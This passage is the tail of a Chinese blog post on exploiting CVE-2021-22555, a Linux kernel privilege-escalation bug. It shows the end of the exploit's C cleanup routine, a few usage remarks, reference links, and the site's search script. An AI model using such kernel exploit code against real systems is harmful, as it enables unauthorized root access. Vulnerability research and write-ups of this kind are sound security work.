&#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] close&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (close(pipefd[i][<span class="number">1</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] close&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_rmid:</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == fake_idx)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (msgctl(msqid[i], IPC_RMID, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      perror(<span class="string">&quot;[-] msgctl&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">err_no_rmid:</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>效果：</p>
<p>中间有个<code>getchar()</code>，按下回车即可，本来放这是为了方便调试的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220515143144038.png" alt="image-20220515143144038"></p>
<p>不行的话可以多尝试几次</p>
<p>然后逃逸容器的我没尝试，也不太会，可以参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#FINAL-EXPLOIT" >arttnba3师傅的容器逃逸EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="参考"   >
          <a href="#参考" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考" class="headerlink" title="参考"></a>参考</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027" >CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html" >CVE-2021-22555: Turning \x00\x00 into 10000$ | security-research (google.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>太多了，有点贴不过来了….</p>
</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">139</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">79</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>